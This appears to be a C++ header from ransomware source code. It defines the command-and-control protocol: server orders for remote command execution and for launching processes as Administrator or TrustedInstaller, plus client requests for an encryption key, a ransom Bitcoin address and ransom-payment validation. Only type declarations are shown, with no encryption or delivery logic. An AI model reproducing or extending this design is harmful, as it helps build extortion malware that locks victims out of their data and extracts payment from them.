#ifndef _NETWORK_TYPES_
#define _NETWORK_TYPES_

// Response codes sent from the client to the server
// Usually after a remoteaction is completed
// 'C' = Code
enum ClientResponseCode {
    C_OK                = 0,
    C_ERROR             = -1,
};

// Enums dictating which action to perform on the client
// Sent from the server to client
enum RemoteAction {
    NONE                = -1,
    USE_CLI             = 1,
    OPEN_REMOTE_PROCESS = 4,
    KILL_CLIENT         = 5, // forcefully disconnect the client

};

enum SocketTypes {
    UDP = 1,
    TCP = 2,
};

/*
    A struct representing a server that
    clients can connect to and send requests on.
    Servers have a socket file descriptor which is used
    to send and receive information over sockets.
*/
struct Server {
    int                sfd;      // Socket File Descriptor
    int                domain;   
    int                type;     // Communcation semmantic type. All servers are SOCK_STREAM
    int                protocol; // Server protocol. All server protocols will be 0.
    int                port;     
    struct sockaddr_in addr;     // address struct with info on the server address
};

/*
    A struct representing a message sent from
    a client to a server. 
*/
struct ClientResponse {
    std::string        message;         // String message, detailed info on the error or action
    ClientResponseCode responseCode;    
    RemoteAction       actionPerformed; // ( if any, otherwise put NONE )
};

struct ProcessInformation {
    /*
        If run as trusted installer and run as admin
        are both true, the process will be ran with the highest
        privellages, in this case, trusted installer.
    */
    BOOL               runAsTrustedInstaller;
    BOOL               runAsAdministrator;
    DWORD              creationFlags;         // Windows openprocess creation flags
    std::string        applicationName;       // Name of the application to start
};

// Command sent to the client from the server
typedef struct {
    bool              valid;

    /*
        'pi' is information about a process the server
        wants to start on the remote machine, if the action is
        OPEN_REMOTE_PROCESS, pi will be looked at, otherwise pi can be
        set as NULL
    */
    ProcessInformation pi;

    /*
        The command line arguments provided if action is
        USE_CLI or anything related to the command line,
        otherwise this can be an empty string
    */
    std::string        commandLineArguments;
    std::string        publicEncryptionKey;

    // the action to perform of RemoteAction enum
    RemoteAction       action;
} ServerCommand, ServerRequest, ServerResponse;

/*
    When a client requests the tcp server to do something
*/
typedef struct {
    enum Action {
        NONE = 0x000000,
        CONNECT_CLIENT = 0x100000,
        REQUEST_PUBLIC_ENCRYPTION_KEY = 0x200000,
        VALIDATE_RANSOM_PAYMENT = 0x300000,
        REQUEST_RANSOM_BTC_ADDRESS = 0x400000,
    };

    BOOL               valid;
    Action             action;
    void*              client;
} ClientRequest, ClientMessage;

// A response from the udp server to the udp client
// contains information about the tcp server
struct UDPResponse {
    Server             TCPServer; // Info about the tcp server so the client can connect to it
    BOOL               isValid;
};


#endif